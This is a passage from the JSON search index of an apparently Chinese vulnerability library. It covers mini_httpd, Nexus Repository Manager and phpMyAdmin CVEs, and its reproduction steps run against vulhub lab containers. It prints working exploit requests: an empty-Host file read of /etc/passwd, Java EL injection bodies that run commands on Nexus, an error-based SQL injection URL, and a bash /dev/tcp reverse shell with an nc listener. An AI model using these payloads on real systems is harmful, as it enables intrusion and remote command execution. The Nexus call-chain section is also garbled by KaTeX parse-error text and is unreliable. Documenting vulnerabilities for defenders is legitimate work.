0d\u52a1\u5668\u3002\u800c\u5305\u62ec\u534e\u4e3a\uff0czyxel\uff0c\u6d77\u5eb7\u5a01\u89c6\uff0c\u6811\u8393\u6d3e\u7b49\u5728\u5185\u7684\u5382\u5546\u7684\u65d7\u4e0b\u8bbe\u5907\u90fd\u66fe\u91c7\u7528Mini_httpd\u7ec4\u4ef6\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>ACME mini_httpd before 1.30</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/#_3","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>\u5728mini_httpd\u5f00\u542f\u865a\u62df\u4e3b\u673a\u6a21\u5f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u8bf7\u6c42http://HOST/FILE\u5c06\u4f1a\u8bbf\u95ee\u5230\u5f53\u524d\u76ee\u5f55\u4e0b\u7684HOST/FILE\u6587\u4ef6\u3002 (void) snprintf( vfile, sizeof(vfile), \"%s/%s\", req_hostname, f ); \u89c1\u4e0a\u8ff0\u4ee3\u7801\uff0c\u5206\u6790\u5982\u4e0b\uff1a \u5f53HOST=example.com\u3001FILE=index.html\u7684\u65f6\u5019\uff0c\u4e0a\u8ff0\u8bed\u53e5\u7ed3\u679c\u4e3aexample.com/index.html\uff0c\u6587\u4ef6\u6b63\u5e38\u8bfb\u53d6\u3002 \u5f53HOST\u4e3a\u7a7a\u3001FILE=etc/passwd\u7684\u65f6\u5019\uff0c\u4e0a\u8ff0\u8bed\u53e5\u7ed3\u679c\u4e3a/etc/passwd\u3002 \u540e\u8005\u88ab\u4f5c\u4e3a\u7edd\u5bf9\u8def\u5f84\uff0c\u4e8e\u662f\u8bfb\u53d6\u5230\u4e86/etc/passwd\uff0c\u9020\u6210\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u3002 \u73af\u5883\u642d\u5efa``` cd vulhub/mini_httpd/CVE-2018-18778</p> <p>docker-compose up -d</p> <p>\u542f\u52a8mini_httpd 1.29\uff1a   </p> <p>\u73af\u5883\u542f\u52a8\u540e\uff0c\u8bbf\u95eehttp://your-ip:8080\u5373\u53ef\u770b\u5230Web\u9875\u9762\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/#_4","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u53d1\u9001\u8bf7\u6c42\u662f\u5c06Host\u7f6e\u7a7a\uff0cPATH\u7684\u503c\u662f\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84\uff1a``` GET /etc/passwd HTTP/1.1 Host:  Accept-Encoding: gzip, deflate Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close  </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/","title":"Nexus Repository Manager 3 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eCVE-2019-7238","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/#_1","title":"\u5f71\u54cd\u7248\u672c","text":"<p>Nexus Repository Manager OSS/Pro 3.6.2 \u7248\u672c\u5230 3.14.0 \u7248\u672c</p> <p>Nexus Repository Manager 3  \u662f\u4e00\u6b3e\u8f6f\u4ef6\u4ed3\u5e93\uff0c\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u548c\u5206\u53d1Maven\u3001NuGET\u7b49\u8f6f\u4ef6\u6e90\u4ed3\u5e93\u3002\u51763.14.0\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\uff0c\u5b58\u5728\u4e00\u5904\u57fa\u4e8eOrientDB\u81ea\u5b9a\u4e49\u51fd\u6570\u7684\u4efb\u610fJEXL\u8868\u8fbe\u5f0f\u6267\u884c\u529f\u80fd\uff0c\u800c\u8fd9\u5904\u529f\u80fd\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u5c06\u53ef\u4ee5\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/#_2","title":"\u6f0f\u6d1e\u6210\u56e0","text":"<p>###\u7531\u4e8e\u672a\u6388\u6743\u8bbf\u95ee\u7684\u7528\u6237\u53ef\u4ee5\u6784\u9020\u8bf7\u6c42\u800c\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\uff0c\u89e6\u53d1\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <p>ExtDirectModuleKaTeX parse error: Expected 'EOF', got '#' at position 14: configure:60 #\u0332 \u8def\u7531\u7ed1\u5b9a\u4e0e\u8bf7\u6c42\u89e3\u6790 ExtD\u2026doPost:155 # \u5904\u7406post\u8bf7\u6c42  DirectJNgineServletKaTeX parse error: Expected 'EOF', got '#' at position 12: doPost:595 #\u0332 \u6839\u636e\u4e0d\u540c\u7684Content-T\u2026processRequest:632 # \u89e3\u6790json\u8bf7\u6c42  JsonRequestProcesorKaTeX parse error: Expected 'EOF', got '#' at position 13: process:119 #\u0332 \u89e3\u6790json\u8bed\u6cd5\u6811 Json\u2026getIndividualJsonRequests:216 # \u63d0\u53d6json\u6570\u636e  JsonRequestProcesorKaTeX parse error: Expected 'EOF', got '#' at position 13: process:133 #\u0332 \u6784\u9020\u8fd4\u56de\u7ed3\u6784 Compone\u2026previewAssets:188 # \u89e3\u6790post\u5305\u4e2d\u7684data\u6570\u636e\u5e76\u6784\u9020\u67e5\u8be2\u8bed\u53e5\u67e5\u8be2\u5305  ComponentComponentKaTeX parse error: Expected 'EOF', got '#' at position 19: \u2026viewAssets:208 #\u0332 \u83b7\u5f97\u67e5\u8be2\u7ed3\u679c BrowseS\u2026previewAssets:252 # \u6784\u5efaOrientDb\u67e5\u8be2\u8bed\u53e5  BrowseServiceImplKaTeX parse error: Expected 'EOF', got '#' at position 19: \u2026viewAssets:258 #\u0332 \u62fc\u63a5\u67e5\u8be2\u8bed\u53e5 BrowseS\u2026previewAssets:262 # \u6267\u884c\u67e5\u8be2  MetadataNodeEntityAdapterKaTeX parse error: Expected 'EOF', got '#' at position 18: \u2026untByQuery:221 #\u0332 \u6267\u884cOrientDb\u67e5\u8be2\u8bed\u53e5\u2026execute:125 # \u63d0\u53d6jexl\u8868\u8fbe\u5f0f  ContextExpressionFunction$checkJexlExpression:15</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/#_3","title":"\u4fee\u590d\u65b9\u6cd5","text":"<p>\u76ee\u524d\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u65b0\u7248\u672c\u4fee\u6539\u4e86\u8be5\u6f0f\u6d1e\uff0c\u5efa\u8bae\u60a8\u53c2\u7167\u4e0a\u8ff0\u3010\u5b89\u5168\u7248\u672c\u3011\u5347\u7ea7\u5230\u5bf9\u5e94\u7684\u6700\u65b0\u7248\u672c\u3002</p> <p>\u6700\u65b0\u7248\u672c\u4e0b\u8f7d\u94fe\u63a5\uff1a</p> <p>https://help.sonatype.com/repomanager3/download</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/#_4","title":"\u73af\u5883\u642d\u5efa","text":"<p>1.\u5728centos 7 \u4e0a\u5b89\u88c5docker\u548cdocker-compose</p> <pre><code>(1).\u5b89\u88c5PIP\ncurl -s https://bootstrap.pypa.io/get-pip.py | python3\n(2).\u5b89\u88c5docker\ncurl -s https://get.docker.com/ | sh\n(3).\u542f\u52a8docker\u670d\u52a1\nservice docker start\n123456\n</code></pre> <p></p> <pre><code>(4).\u5b89\u88c5docker compose\npip install docker-compose\n12\n</code></pre> <p>2.\u4f7f\u7528\u65b9\u6cd5</p> <pre><code>(1).\u4e0b\u8f7d\u6f0f\u6d1e\u73af\u5883\u9879\u76ee\ngit clone https://github.com/vulhub/vulhub.git\n(2).\u8fdb\u5165\u5230nexus\u5229\u7528\u73af\u5883\ncd vulhub/nexus/CVE-2019-7238\n(3).\u7f16\u8bd1\u73af\u5883\ndocker-compose build\n123456\n</code></pre> <p></p> <pre><code>(4).\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u542f\u52a8Nexus Repository Manager 3.14.0\ndocker-compose build\n12\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/#_5","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>1.\u8fdb\u5165\u5230CVE-2019-7238\u76ee\u5f55  cd CVE-2019-7238  2.\u4fee\u6539cve-2019-7238.py.\u8fd9\u91cc\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u6765\u4fee\u6539remote = \u2018 http://192.168.1.144:8081 \uff08\u5b58\u5728\u6f0f\u6d1e\u7684\u4e3b\u673aip\u5730\u5740\uff09\u2018\u548c ARCH = \u201c LINUX \u201d\u7684\u503c\uff0c\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95eehttp://192.168.1.144:8081,\u5982\u4e0b\u56fe\u6240\u793a\uff1a  </p> <p>3.\u5728\u653b\u51fb\u8005\u7cfb\u7edf\u4e2d\u6267\u884ccve-2019-7238.py\u811a\u672c\uff0c\u7136\u540e\u8f93\u5165\u53cd\u5f39NC\u7684bash\uff08\u6b64\u5904\u7684IP\u5730\u5740\u662f\u653b\u51fb\u8005\u7684ip\u5730\u5740\uff0c\u5373192.168.1.165\uff0c\u7aef\u53e3\u4efb\u610f\uff09  bash -i &gt;&amp; /dev/tcp/192.168.1.165/2333 0&gt;&amp;1    4.\u5728\u653b\u51fb\u8005\u7cfb\u7edf\u4e2d\u6267\u884cNC\u76d1\u542c\u53cd\u5f39\uff08\u5728\u653b\u51fb\u673a\u4e0a\u6267\u884c\u53cd\u5f39shell\uff0c\u5373\u5728192.168.1.165\u673a\u5668\u4e0a\uff09  nc -lvvp 2333  </p> <p>#\u53c2\u8003\u94fe\u63a5\uff1a</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%20Groovy%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11753%EF%BC%89/","title":"Nexus Repository Manager Groovy\u6ce8\u5165\u6f0f\u6d1e\uff08CVE 2020 11753\uff09","text":"<p>\u200b                                                                                   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%20Groovy%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11753%EF%BC%89/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>\u200b               Sonatype Nexus Repository Manager\uff08NXRM\uff09\u662f\u7f8e\u56fdSonatype\u516c\u53f8\u7684\u4e00\u6b3eMaven\u4ed3\u5e93\u7ba1\u7406\u5668\u3002</p> <p>Sonatype NXRM\u4e2d\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u7ed5\u8fc7\u5b89\u5168\u9650\u5236\uff0c\u63d0\u5347\u6743\u9650\u3002      </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%20Groovy%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11753%EF%BC%89/#_2","title":"\u6f0f\u6d1e\u516c\u544a","text":"<p>\u200b               \u76ee\u524d\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u6f0f\u6d1e\uff0c\u8865\u4e01\u83b7\u53d6\u94fe\u63a5\uff1a</p> <p>https://support.sonatype.com/hc/en-us/articles/360046233714-CVE-2020-11753-Nexus-Repository-Manager-3-Improper-Access-Controls-2020-04-16 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%20Groovy%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11753%EF%BC%89/#_3","title":"\u53c2\u8003\u7f51\u5740","text":"<p>\u200b               \u6765\u6e90:CONFIRM</p> <p>\u94fe\u63a5:https://support.sonatype.com/hc/en-us/articles/360046233714</p> <p>\u6765\u6e90:nvd.nist.gov</p> <p>\u94fe\u63a5:https://nvd.nist.gov/vuln/detail/CVE-2020-11753</p> <p>\u6765\u6e90:vigilance.fr</p> <p>\u94fe\u63a5:https://vigilance.fr/vulnerability/Sonatype-Nexus-Repository-Manager-privilege-escalation-32056 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%20Groovy%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11753%EF%BC%89/#_4","title":"\u53d7\u5f71\u54cd\u5b9e\u4f53","text":"<ul> <li> <p>\u200b                   \u6682\u65e0           </p> </li> </ul> <p>\u66f4\u591a&gt;&gt;</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%20Groovy%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11753%EF%BC%89/#_5","title":"\u8865\u4e01","text":"<ul> <li>Sonatype Nexus Repository Manager \u5b89\u5168\u6f0f\u6d1e\u7684\u4fee\u590d\u63aa\u65bd</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/","title":"nexus oss \u547d\u4ee4\u6267\u884c\u6f0f\u6d1e (cve-2020-10199 && 10204)","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#nexus-repository-oss","title":"nexus repository oss","text":"<p>Nexus Repository OSS 3\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u4ed3\u5e93\u7ba1\u7406\u7cfb\u7edf\uff0c\u63d0\u4f9b\u4e86\u66f4\u52a0\u4e30\u5bcc\u7684\u529f\u80fd\uff0c\u800c\u4e14\u5b89\u88c5\u3001\u914d\u7f6e\u3001\u4f7f\u7528\u8d77\u6765\u4e5f\u66f4\u52a0\u7b80\u5355\u65b9\u4fbf\u3002OSS 3\u7248\u672c\u4e3b\u8981\u652f\u6301\u7684\u4ed3\u5e93\uff08Repository\uff09\u5305\u62ec\u5982\u4e0b\uff1a bower\u3001docker\u3001maven\u3001npm\u3001nuget\u3001pypi\u3001raw\u3001rubygems\u3001yum</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>10199\u7684\u6f0f\u6d1e\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\u5373\u53ef\u89e6\u53d1\uff0c\u800c10204\u5219\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002\u4e24\u4e2a\u6f0f\u6d1e\u7684\u89e6\u53d1\u539f\u56e0\u5747\u662f\u4e0d\u5b89\u5168\u7684\u6267\u884cEL\u8868\u8fbe\u5f0f\u5bfc\u81f4\u7684</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#_2","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u542f\u52a8\u6f0f\u6d1e\u73af\u5883 <code>docker run -it -p 8081:8081 -d co0ontty/cve-2020-10199</code> \u67e5\u770b\u7528\u6237\u540d\u5bc6\u7801<code>\u67e5\u770b DOCKER CONTAINER ID docker ps  \u67e5\u770b\u5bc6\u7801 \u5176\u4e2d bc91335e3518 \u4e3a DOCKER CONTAINER ID docker exec -it bc91335e3518 cat /root/sonatype-work/nexus3/admin.password</code>\u8bbf\u95ee http://ip:8081</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#cve-2020-10199","title":"cve-2020-10199","text":"<p>\u547d\u4ee4\u6267\u884c\uff1a``` POST /service/extdirect HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 372 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close</p> <p>{\"action\":\"cleanup_CleanupPolicy\",\"method\":\"create\",\"data\":[{\"name\":\"co0ontty\",\"format\":\"$\\.{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /opt/cve-2020-10199')}\",\"notes\":\"222\",\"mode\":\"delete\",\"lastBlobUpdatedEnabled\":false,\"lastDownloadedEnabled\":false,\"releaseTypeEnabled\":false,\"regexEnabled\":false,\"criteria\":{}}],\"type\":\"rpc\",\"tid\":33}  <code>![](https://www.bylibrary.cn/wp-content/uploads/2020/09/nexus-10199-1.png) \u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff1a</code> POST /service/rest/beta/repositories/apt/hosted HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 358 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close</p> <p>{   \"name\": \"interna1l\",   \"online\": true,   \"storage\": {     \"blobStoreName\": \"default\",     \"strictContentTypeValidation\": true,     \"writePolicy\": \"allow_once\"   },   \"cleanup\": {     \"policyNames\": [\"co0ontty\"]   },   \"apt\": {     \"distribution\": \"bionic\"   },   \"aptSigning\": {     \"keypair\": \"string\",     \"passphrase\": \"string\"   } }  ```</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#cve-2020-10204","title":"cve-2020-10204","text":"<p>\u547d\u4ee4\u6267\u884c\u4e00\uff1a``` POST /service/extdirect HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 362 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close</p> <p>{\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"userId\":\"test\",\"version\":\"4\",\"firstName\":\"test\",\"lastName\":\"test\",\"email\":\"test@qq.com\",\"status\":\"active\",\"roles\":[\"nx-admin$\\.{''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('touch /opt/co0ontty.success')}\"]}],\"type\":\"rpc\",\"tid\":20}  <code>![](https://www.bylibrary.cn/wp-content/uploads/2020/09/nexus-10204.png) \u547d\u4ee4\u6267\u884c\u4e8c\uff1a</code> POST /service/rest/beta/repositories/go/group HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 214 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=6d9fd8c5-4b18-4680-b332-09600e9d34b5 Connection: close</p> <p>{   \"name\": \"interna1l\",   \"online\": true,   \"group\": {     \"memberNames\": [\"${'co0ontty'.toUpperCase()}\"]   },   \"storage\": {     \"blobStoreName\": \"default\",     \"strictContentTypeValidation\": true   } }  ```</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#_3","title":"\u89e3\u51b3\u65b9\u6848","text":"<p>\u8bf7\u5347\u7ea7\u7248\u672c\u5230 Nexus Repository Manager OSS/Pro 3.21.2 \u6216\u66f4\u9ad8\u7248\u672c \u851a\u84dd\u76fe\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u5df2\u652f\u6301\u5bf9 CVE-2020-10199 \u53ca CVE-2020-10204 \u7684\u9632\u5fa1</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpMyAdmin%20SQL%E6%B3%A8%E5%85%A5%28CVE-2020-0554%29/","title":"phpMyAdmin SQL\u6ce8\u5165(CVE-2020-0554)","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpMyAdmin%20SQL%E6%B3%A8%E5%85%A5%28CVE-2020-0554%29/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>phpMyAdmin 4 &lt; 4.9.4 phpMyAdmin 5 &lt; 5.0.1 \u5df2\u77e5\u4e00\u4e2a\u7528\u6237\u540d\u5bc6\u7801</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpMyAdmin%20SQL%E6%B3%A8%E5%85%A5%28CVE-2020-0554%29/#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u6ce8\u5165\u70b9\u4e3ausername\uff0c\u62a5\u9519\u6ce8\u5165\uff0c\u8bed\u53e5\u683c\u5f0f\u5982\u4e0b<code>http://**********/server_privileges.php?ajax_request=true&amp;validate_username=1&amp;username=1%27and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))--+db=&amp;token=c2064a8c5f437da931fa01de5aec6581&amp;viewing_mode=server</code></p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpMyAdmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","title":"phpMyAdmin\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpMyAdmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>phpMyAdmin 